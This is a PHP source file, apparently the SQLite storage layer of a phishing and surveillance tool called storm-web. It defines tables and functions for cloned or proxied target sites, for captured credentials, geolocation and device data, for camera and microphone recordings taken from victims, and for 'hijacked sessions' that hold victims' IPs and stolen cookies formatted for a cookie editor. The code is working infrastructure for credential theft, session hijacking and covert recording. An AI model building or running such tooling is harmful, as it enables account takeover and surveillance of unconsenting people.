<?php
/**
 * lib/store.php — SQLite storage layer.
 *
 * Replaces the flat-file model (result.txt, meta.json, notifications-state.json)
 * with a single SQLite database at storm-web/data/storm.db.
 *
 * Binary media (captures/*.png, audio/*.webm) stay on disk — the `media`
 * table tracks filenames so we never need scandir() to list or count them.
 *
 * Every public function name starts with `store_`. The PDO handle is a
 * lazy singleton; the schema auto-creates on first open.
 */

/** Path to the SQLite database, relative to storm-web/. */
define('STORE_DB_PATH', __DIR__ . '/../data/storm.db');

/** @var PDO|null */
$__store_pdo = null;

/* =================================================================== *
 *  Connection
 * =================================================================== */

function store_open(): PDO {
    global $__store_pdo;
    if ($__store_pdo !== null) return $__store_pdo;

    $dir = dirname(STORE_DB_PATH);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    $pdo = new PDO('sqlite:' . STORE_DB_PATH, null, null, [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
    $pdo->exec('PRAGMA journal_mode = WAL');
    $pdo->exec('PRAGMA foreign_keys = ON');
    $pdo->exec('PRAGMA busy_timeout = 5000');

    store_ensure_schema($pdo);

    $__store_pdo = $pdo;
    return $pdo;
}

function store_ensure_schema(PDO $pdo): void {
    $version = (int) $pdo->query("PRAGMA user_version")->fetchColumn();

    if ($version < 1) {
        $pdo->exec("BEGIN EXCLUSIVE");
        $pdo->exec("
            CREATE TABLE IF NOT EXISTS targets (
                slug        TEXT PRIMARY KEY,
                url         TEXT NOT NULL,
                host        TEXT NOT NULL DEFAULT '',
                payloads    TEXT NOT NULL DEFAULT '[]',
                consent     TEXT NOT NULL DEFAULT '{}',
                render_mode TEXT NOT NULL DEFAULT 'http',
                custom_js   TEXT NOT NULL DEFAULT '',
                created_at  INTEGER NOT NULL DEFAULT 0
            );

            CREATE TABLE IF NOT EXISTS events (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                target_slug TEXT NOT NULL REFERENCES targets(slug) ON DELETE CASCADE,
                kind        TEXT NOT NULL CHECK(kind IN ('device','geo','cred','consent','session')),
                payload     TEXT NOT NULL DEFAULT '{}',
                captured_at INTEGER NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_events_slug ON events(target_slug);
            CREATE INDEX IF NOT EXISTS idx_events_kind ON events(kind);
            CREATE INDEX IF NOT EXISTS idx_events_ts   ON events(captured_at DESC);

            CREATE TABLE IF NOT EXISTS media (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                target_slug TEXT NOT NULL REFERENCES targets(slug) ON DELETE CASCADE,
                kind        TEXT NOT NULL CHECK(kind IN ('camera','mic')),
                filename    TEXT NOT NULL,
                filesize    INTEGER NOT NULL DEFAULT 0,
                captured_at INTEGER NOT NULL,
                UNIQUE(target_slug, kind, filename)
            );
            CREATE INDEX IF NOT EXISTS idx_media_slug ON media(target_slug);
            CREATE INDEX IF NOT EXISTS idx_media_ts   ON media(captured_at DESC);

            CREATE TABLE IF NOT EXISTS kv (
                key   TEXT PRIMARY KEY,
                value TEXT NOT NULL DEFAULT ''
            );

            PRAGMA user_version = 1;
        ");
        $pdo->exec("COMMIT");
        $version = 1;
    }

    if ($version < 2) {
        $pdo->exec("BEGIN EXCLUSIVE");
        $pdo->exec("
            ALTER TABLE targets ADD COLUMN mode TEXT NOT NULL DEFAULT 'clone'
                CHECK(mode IN ('clone','proxy'));

            CREATE TABLE IF NOT EXISTS sessions (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                target_slug TEXT NOT NULL REFERENCES targets(slug) ON DELETE CASCADE,
                victim_id   TEXT NOT NULL,
                ip          TEXT NOT NULL DEFAULT '',
                ua          TEXT NOT NULL DEFAULT '',
                cookies     TEXT NOT NULL DEFAULT '{}',
                cookie_editor TEXT NOT NULL DEFAULT '[]',
                verdict     TEXT NOT NULL DEFAULT 'unknown',
                captured_at INTEGER NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_sessions_slug ON sessions(target_slug);
            CREATE INDEX IF NOT EXISTS idx_sessions_ts   ON sessions(captured_at DESC);

            PRAGMA user_version = 2;
        ");
        $pdo->exec("COMMIT");
    }
}

/* =================================================================== *
 *  Targets
 * =================================================================== */

function store_target_create(
    string $slug,
    string $url,
    string $host,
    array  $payloads,
    array  $consent,
    string $render_mode,
    string $custom_js = '',
    string $mode = 'clone'
): void {
    $pdo = store_open();
    $st  = $pdo->prepare("
        INSERT INTO targets (slug, url, host, payloads, consent, render_mode, custom_js, mode, created_at)
        VALUES (:slug, :url, :host, :payloads, :consent, :render_mode, :custom_js, :mode, :created_at)
    ");
    $st->execute([
        ':slug'        => $slug,
        ':url'         => $url,
        ':host'        => $host,
        ':payloads'    => json_encode($payloads),
        ':consent'     => json_encode($consent),
        ':render_mode' => $render_mode,
        ':custom_js'   => $custom_js,
        ':mode'        => $mode,
        ':created_at'  => time(),
    ]);
}

function store_target_get(string $slug): ?array {
    $pdo = store_open();
    $st  = $pdo->prepare("SELECT * FROM targets WHERE slug = :slug");
    $st->execute([':slug' => $slug]);
    $row = $st->fetch();
    if ($row === false) return null;
    return store_target_hydrate($row);
}

function store_target_list(): array {
    $pdo  = store_open();
    $rows = $pdo->query("SELECT * FROM targets ORDER BY created_at DESC")->fetchAll();
    return array_map('store_target_hydrate', $rows);
}

function store_target_hydrate(array $row): array {
    $row['payloads'] = json_decode($row['payloads'], true) ?: [];
    $row['consent']  = json_decode($row['consent'], true) ?: [];
    $row['created_at'] = (int) $row['created_at'];
    return $row;
}

function store_target_update(string $slug, array $fields): bool {
    $allowed = ['url', 'host', 'payloads', 'consent', 'render_mode', 'custom_js', 'slug', 'mode'];
    $sets    = [];
    $params  = [':_slug' => $slug];

    foreach ($fields as $k => $v) {
        if (!in_array($k, $allowed, true)) continue;
        if ($k === 'payloads' || $k === 'consent') $v = json_encode($v);
        $sets[]           = "$k = :$k";
        $params[":$k"]   = $v;
    }
    if (empty($sets)) return false;

    $pdo = store_open();
    $sql = "UPDATE targets SET " . implode(', ', $sets) . " WHERE slug = :_slug";
    return $pdo->prepare($sql)->execute($params);
}

function store_target_delete(string $slug): bool {
    $pdo = store_open();
    $st  = $pdo->prepare("DELETE FROM targets WHERE slug = :slug");
    $st->execute([':slug' => $slug]);
    return $st->rowCount() > 0;
}

/* =================================================================== *
 *  Events  (replaces result.txt)
 * =================================================================== */

function store_event_add(string $slug, string $kind, array $payload, int $captured_at): int {
    $pdo = store_open();
    $st  = $pdo->prepare("
        INSERT INTO events (target_slug, kind, payload, captured_at)
        VALUES (:slug, :kind, :payload, :ts)
    ");
    $st->execute([
        ':slug'    => $slug,
        ':kind'    => $kind,
        ':payload' => json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE),
        ':ts'      => $captured_at,
    ]);
    return (int) $pdo->lastInsertId();
}

/**
 * List events, optionally filtered by slug, kind, and/or since timestamp.
 * Returns newest-first. $limit = 0 means no limit.
 */
function store_event_list(?string $slug = null, ?string $kind = null, int $since = 0, int $limit = 0): array {
    $pdo    = store_open();
    $where  = [];
    $params = [];
    if ($slug !== null)  { $where[] = "target_slug = :slug"; $params[':slug'] = $slug; }
    if ($kind !== null)  { $where[] = "kind = :kind";        $params[':kind'] = $kind; }
    if ($since > 0)      { $where[] = "captured_at > :since"; $params[':since'] = $since; }

    $sql = "SELECT * FROM events";
    if ($where) $sql .= " WHERE " . implode(' AND ', $where);
    $sql .= " ORDER BY captured_at DESC";
    if ($limit > 0) $sql .= " LIMIT $limit";

    $st = $pdo->prepare($sql);
    $st->execute($params);
    $rows = $st->fetchAll();
    foreach ($rows as &$r) {
        $r['payload']     = json_decode($r['payload'], true) ?: [];
        $r['captured_at'] = (int) $r['captured_at'];
        $r['id']          = (int) $r['id'];
    }
    return $rows;
}

function store_event_count(string $slug, int $since = 0): array {
    $pdo    = store_open();
    $params = [':slug' => $slug];
    $sql    = "SELECT COUNT(*) as cnt, MAX(captured_at) as last_ts FROM events WHERE target_slug = :slug";
    if ($since > 0) {
        $sql .= " AND captured_at > :since";
        $params[':since'] = $since;
    }
    $st = $pdo->prepare($sql);
    $st->execute($params);
    $row = $st->fetch();
    return [(int) ($row['cnt'] ?? 0), (int) ($row['last_ts'] ?? 0)];
}

function store_event_delete(int $id): bool {
    $pdo = store_open();
    $st  = $pdo->prepare("DELETE FROM events WHERE id = :id");
    $st->execute([':id' => $id]);
    return $st->rowCount() > 0;
}

function store_event_delete_by_kind(string $slug, ?string $kind = null): int {
    $pdo    = store_open();
    $params = [':slug' => $slug];
    $sql    = "DELETE FROM events WHERE target_slug = :slug";
    if ($kind !== null) {
        $sql .= " AND kind = :kind";
        $params[':kind'] = $kind;
    }
    $st = $pdo->prepare($sql);
    $st->execute($params);
    return $st->rowCount();
}

/**
 * Total bytes of event payloads for a target (rough equivalent of result.txt filesize).
 */
function store_event_log_size(string $slug): int {
    $pdo = store_open();
    $st  = $pdo->prepare("SELECT COALESCE(SUM(LENGTH(payload)), 0) FROM events WHERE target_slug = :slug");
    $st->execute([':slug' => $slug]);
    return (int) $st->fetchColumn();
}

/* =================================================================== *
 *  Media  (tracks captures/*.png + audio/*.webm on disk)
 * =================================================================== */

function store_media_register(string $slug, string $kind, string $filename, int $filesize, int $captured_at): void {
    $pdo = store_open();
    $st  = $pdo->prepare("
        INSERT OR IGNORE INTO media (target_slug, kind, filename, filesize, captured_at)
        VALUES (:slug, :kind, :filename, :filesize, :ts)
    ");
    $st->execute([
        ':slug'     => $slug,
        ':kind'     => $kind,
        ':filename' => $filename,
        ':filesize' => $filesize,
        ':ts'       => $captured_at,
    ]);
}

function store_media_list(?string $slug = null, ?string $kind = null, int $since = 0): array {
    $pdo    = store_open();
    $where  = [];
    $params = [];
    if ($slug !== null) { $where[] = "target_slug = :slug"; $params[':slug'] = $slug; }
    if ($kind !== null) { $where[] = "kind = :kind";        $params[':kind'] = $kind; }
    if ($since > 0)     { $where[] = "captured_at > :since"; $params[':since'] = $since; }

    $sql = "SELECT * FROM media";
    if ($where) $sql .= " WHERE " . implode(' AND ', $where);
    $sql .= " ORDER BY captured_at DESC";

    $st = $pdo->prepare($sql);
    $st->execute($params);
    $rows = $st->fetchAll();
    foreach ($rows as &$r) {
        $r['captured_at'] = (int) $r['captured_at'];
        $r['filesize']    = (int) $r['filesize'];
        $r['id']          = (int) $r['id'];
    }
    return $rows;
}

function store_media_count(string $slug, string $kind): int {
    $pdo = store_open();
    $st  = $pdo->prepare("SELECT COUNT(*) FROM media WHERE target_slug = :slug AND kind = :kind");
    $st->execute([':slug' => $slug, ':kind' => $kind]);
    return (int) $st->fetchColumn();
}

function store_media_delete(string $slug, string $kind, string $filename): bool {
    $pdo = store_open();
    $st  = $pdo->prepare("DELETE FROM media WHERE target_slug = :slug AND kind = :kind AND filename = :filename");
    $st->execute([':slug' => $slug, ':kind' => $kind, ':filename' => $filename]);
    return $st->rowCount() > 0;
}

function store_media_delete_all(string $slug, string $kind): int {
    $pdo = store_open();
    $st  = $pdo->prepare("DELETE FROM media WHERE target_slug = :slug AND kind = :kind");
    $st->execute([':slug' => $slug, ':kind' => $kind]);
    return $st->rowCount();
}

/* =================================================================== *
 *  Key-value  (replaces notifications-state.json and future settings)
 * =================================================================== */

function store_kv_get(string $key, ?string $default = null): ?string {
    $pdo = store_open();
    $st  = $pdo->prepare("SELECT value FROM kv WHERE key = :key");
    $st->execute([':key' => $key]);
    $val = $st->fetchColumn();
    return $val !== false ? $val : $default;
}

function store_kv_set(string $key, string $value): void {
    $pdo = store_open();
    $st  = $pdo->prepare("INSERT INTO kv (key, value) VALUES (:key, :value)
                           ON CONFLICT(key) DO UPDATE SET value = excluded.value");
    $st->execute([':key' => $key, ':value' => $value]);
}

/* =================================================================== *
 *  Sessions  (hijacked sessions from proxy mode)
 * =================================================================== */

function store_session_add(string $slug, string $victim_id, string $ip, string $ua, array $cookies, array $cookie_editor, string $verdict): int {
    $pdo = store_open();
    $st  = $pdo->prepare("
        INSERT INTO sessions (target_slug, victim_id, ip, ua, cookies, cookie_editor, verdict, captured_at)
        VALUES (:slug, :vid, :ip, :ua, :cookies, :ce, :verdict, :ts)
    ");
    $st->execute([
        ':slug'    => $slug,
        ':vid'     => $victim_id,
        ':ip'      => $ip,
        ':ua'      => $ua,
        ':cookies' => json_encode($cookies, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE),
        ':ce'      => json_encode($cookie_editor, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE),
        ':verdict' => $verdict,
        ':ts'      => time(),
    ]);
    return (int) $pdo->lastInsertId();
}

function store_session_list(?string $slug = null, int $limit = 100): array {
    $pdo    = store_open();
    $params = [];
    $sql    = "SELECT * FROM sessions";
    if ($slug !== null) {
        $sql .= " WHERE target_slug = :slug";
        $params[':slug'] = $slug;
    }
    $sql .= " ORDER BY captured_at DESC LIMIT :lim";
    $st = $pdo->prepare($sql);
    foreach ($params as $k => $v) $st->bindValue($k, $v);
    $st->bindValue(':lim', $limit, PDO::PARAM_INT);
    $st->execute();
    $rows = $st->fetchAll();
    foreach ($rows as &$r) {
        $r['cookies']       = json_decode($r['cookies'], true) ?: [];
        $r['cookie_editor'] = json_decode($r['cookie_editor'], true) ?: [];
        $r['captured_at']   = (int) $r['captured_at'];
        $r['id']            = (int) $r['id'];
    }
    return $rows;
}

function store_session_get(int $id): ?array {
    $pdo = store_open();
    $st  = $pdo->prepare("SELECT * FROM sessions WHERE id = :id");
    $st->execute([':id' => $id]);
    $row = $st->fetch();
    if ($row === false) return null;
    $row['cookies']       = json_decode($row['cookies'], true) ?: [];
    $row['cookie_editor'] = json_decode($row['cookie_editor'], true) ?: [];
    $row['captured_at']   = (int) $row['captured_at'];
    $row['id']            = (int) $row['id'];
    return $row;
}

function store_session_count(?string $slug = null): int {
    $pdo = store_open();
    if ($slug !== null) {
        $st = $pdo->prepare("SELECT COUNT(*) FROM sessions WHERE target_slug = :slug");
        $st->execute([':slug' => $slug]);
    } else {
        $st = $pdo->query("SELECT COUNT(*) FROM sessions");
    }
    return (int) $st->fetchColumn();
}

function store_session_delete(int $id): bool {
    $pdo = store_open();
    $st  = $pdo->prepare("DELETE FROM sessions WHERE id = :id");
    $st->execute([':id' => $id]);
    return $st->rowCount() > 0;
}
